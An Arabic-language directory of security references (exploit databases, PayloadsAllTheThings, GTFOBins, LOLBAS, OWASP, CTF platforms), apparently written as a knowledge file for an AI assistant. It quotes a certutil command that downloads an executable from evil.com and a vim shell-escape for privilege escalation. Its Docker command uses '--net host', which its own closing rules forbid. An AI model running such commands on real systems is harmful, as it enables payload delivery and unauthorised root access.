# مكتبات الأمن المفتوحة المصدر — GitHub Security Resources

> هذه روابط مرجعية للذكاء لقراءة المفاهيم فقط.
> السيادة كاملة لك — لا تثبيت، لا تنفيذ، لا دخول أنظمة غير مملوكة.

---

## قواعد البيانات الأمنية

| المصدر | الرابط | المحتوى |
|--------|--------|---------|
| CVE Database (NVD) | `https://nvd.nist.gov/vuln/search` | الثغرات الرسمية + CVSS scores |
| Exploit-DB | `https://www.exploit-db.com` | Exploits جاهزة + Proof of Concept |
| CVE Mitre | `https://cve.mitre.org` | سجل CVEs الرسمي |
| Vulners | `https://vulners.com` | بحث في ثغرات متعددة المصادر |
| OSV (Open Source Vulns) | `https://osv.dev` | ثغرات مكتبات المصدر المفتوح |
| GitHub Advisory DB | `https://github.com/advisories` | تنبيهات GitHub الأمنية |

---

## مستودعات Payloads والتقنيات

### PayloadsAllTheThings
- **GitHub**: `https://github.com/swisskyrepo/PayloadsAllTheThings`
- المحتوى: payloads شاملة لـ SQL Injection, XSS, SSRF, SSTI, Path Traversal, XXE, IDOR, Open Redirect, Command Injection, File Inclusion, JWT, OAuth, GraphQL, WebSockets, etc.

```
المجلدات:
SQL Injection/          → MySQL, PostgreSQL, SQLite, MSSQL, Oracle
XSS Injection/          → Reflected, Stored, DOM, Filter Bypass
Command Injection/      → Linux, Windows, Filter Bypass
Directory Traversal/    → Linux, Windows, Encoding tricks
Server Side Request Forgery/ → Cloud Metadata, Internal Services
```

### HackTricks
- **GitHub**: `https://github.com/carlospolop/hacktricks`
- **Gitbook**: `https://book.hacktricks.xyz`
- المحتوى: أشمل مرجع لاختبار الاختراق — Linux + Windows + Web + Cloud + Networks

```
الأقسام المهمة:
/pentesting-web/         → Web attacks methodology
/linux-hardening/        → Linux privilege escalation
/windows-hardening/      → Windows pentest techniques
/cloud-security/         → AWS, GCP, Azure attacks
/network-services/       → Service-by-service pentest guide
```

### SecLists
- **GitHub**: `https://github.com/danielmiessler/SecLists`
- المحتوى: أكبر مجموعة قوائم كلمات وأسماء للاختبار الأمني

```
Passwords/              → كلمات مرور شائعة: rockyou.txt, common.txt
Usernames/              → قوائم أسماء مستخدمين
Discovery/Web-Content/  → مسارات ومجلدات للـ fuzzing
Fuzzing/                → payloads لاختبار البروتوكولات
```

---

## أدوات الاستغلال والإطارات

### GTFOBins (Linux Privilege Escalation)
- **GitHub**: `https://github.com/GTFOBins/GTFOBins.github.io`
- **الموقع**: `https://gtfobins.github.io`
- المحتوى: قائمة ثنائيات Linux يمكن استخدامها للـ privilege escalation أو تجاوز الأمان

```
مثال: إذا وجدت sudo على vim
→ GTFOBins يعطيك: vim -c ':!/bin/bash'
```

### LOLBAS (Windows Living Off the Land)
- **GitHub**: `https://github.com/LOLBAS-Project/LOLBAS`
- **الموقع**: `https://lolbas-project.github.io`
- المحتوى: ثنائيات Windows يمكن استخدامها لتنفيذ كود، download/upload، UAC bypass

```
مثال: certutil يمكن استخدامه لتحميل ملف
→ certutil -urlcache -split -f http://evil.com/file.exe file.exe
```

### RevShells
- **الموقع**: `https://www.revshells.com`
- المحتوى: مولّد reverse shells لجميع اللغات والمنصات

```
Bash, Python, PHP, PowerShell, Perl, Ruby, nc, Java, etc.
→ أدخل IP + Port → يعطيك الكود الجاهز
```

---

## مراجع أمن الويب

### OWASP Top 10 (2021)
- **الموقع**: `https://owasp.org/Top10`
- **GitHub**: `https://github.com/OWASP/Top10`

```
A01: Broken Access Control      → التحقق من الصلاحيات
A02: Cryptographic Failures     → تشفير ضعيف أو بيانات مكشوفة
A03: Injection                  → SQL/OS/LDAP injection
A04: Insecure Design            → تصميم غير آمن
A05: Security Misconfiguration  → إعدادات خاطئة
A06: Vulnerable Components      → مكتبات بثغرات معروفة
A07: Auth Failures              → مشاكل المصادقة
A08: Software Integrity         → مشاكل CI/CD وUpdate pipeline
A09: Logging Failures           → سجلات ناقصة
A10: SSRF                       → Server-Side Request Forgery
```

### OWASP Testing Guide
- **GitHub**: `https://github.com/OWASP/wstg`
- **الموقع**: `https://owasp.org/www-project-web-security-testing-guide/`
- المحتوى: منهجية كاملة لاختبار أمن الويب (700+ صفحة)

### PortSwigger Web Security Academy
- **الموقع**: `https://portswigger.net/web-security`
- المحتوى: مختبرات مجانية لتعلم كل ثغرة ويب مع labs تطبيقية

---

## أمن الـ Cloud والـ Containers

### CloudSploit (Container/Cloud Security)
- **GitHub**: `https://github.com/aquasecurity/cloudsploit`
- أداة مفتوحة المصدر لفحص إعدادات AWS/GCP/Azure

### Trivy Vulnerability Database
- **GitHub**: `https://github.com/aquasecurity/trivy-db`
- قاعدة بيانات الثغرات المستخدمة في Trivy scanner

### Docker Bench for Security
- **GitHub**: `https://github.com/docker/docker-bench-security`
- يفحص Docker daemon وhost configurations مقابل CIS benchmark

```bash
# تشغيله (على جهازك فقط — لا container خارجي)
docker run --rm --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security
```

---

## CTF والتدريب

### HackTheBox
- **الموقع**: `https://www.hackthebox.com`
- بيئات واقعية معزولة للتدريب — legal & authorized

### TryHackMe
- **الموقع**: `https://tryhackme.com`
- مسارات تعليمية وغرف تدريبية للمبتدئين

### VulnHub
- **الموقع**: `https://www.vulnhub.com`
- VMs جاهزة للتحميل والاختراق محلياً

### PentesterLab
- **الموقع**: `https://pentesterlab.com`
- مختبرات ويب متخصصة مع شروحات

### OverTheWire (Wargames)
- **الموقع**: `https://overthewire.org/wargames`
- تحديات Linux terminal: Bandit (مبتدئ) → Narnia → Leviathan

---

## مراجع Python الأمنية

```python
# مكتبات Python الأساسية للأمن

# Scapy — بناء وتحليل الحزم
# pip install scapy
from scapy.all import *

# Cryptography — تشفير موثوق
# pip install cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization

# Requests + BeautifulSoup — web scraping آمن
# pip install requests beautifulsoup4

# Shodan — بحث في الإنترنت
# pip install shodan

# python-nmap — wrapper لـ nmap
# pip install python-nmap
import nmap

# Impacket — بروتوكولات Windows
# pip install impacket

# Paramiko — SSH client
# pip install paramiko

# OpenAI SDK — للذكاء الاصطناعي المحلي (Docker Model Runner / Ollama)
# pip install openai
```

---

## قواعد الاستخدام

```
✅ هذه المراجع للتعلم والتدريب في بيئات مصرح بها
✅ استخدامها على أصولك أو في CTF competitions
✅ الذكاء يستشهد بها في شروحاته فقط
❌ لا تنفيذ على أنظمة الغير بدون إذن خطي
❌ ممنوع --privileged | ممنوع --net=host
❌ الذكاء لا يشغّل أي كود من هنا إلا بأمرك الصريح
```
